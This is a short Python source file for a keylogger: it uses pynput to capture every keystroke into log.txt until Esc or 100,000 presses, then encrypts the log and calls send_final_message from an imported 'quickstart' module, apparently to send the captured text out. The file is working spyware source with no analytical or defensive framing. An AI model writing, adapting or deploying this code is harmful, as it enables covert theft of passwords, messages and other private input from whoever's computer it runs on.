from pynput.keyboard import Listener, Key
from encrypt import encrypt
from quickstart import send_final_message


count = 0

def on_press(key):
    global count
    letter = str(key)
    letter = letter.replace("'","") 
    special_keys(letter)
    count += 1
    if count == 100000:
        return False

def special_keys(letter):
    if letter == "Key.space":
        letter = " "

    if letter == "Key.enter":
        letter = "\n"

    if letter.find("Key") == -1:
        with open("log.txt","a") as f:
            f.write(letter)
        
   

def on_release(key):
    if key == Key.esc:
        f = open("log.txt","a")
        f.write("\n")
        return False
        

with Listener(on_press=on_press, on_release=on_release) as l:
    l.join()


encrypt()                                       #Encrypting the logfile from encrypte script

try:
    if __name__ == "__main__":
        send_final_message()

except Exception as error:
    print(error)



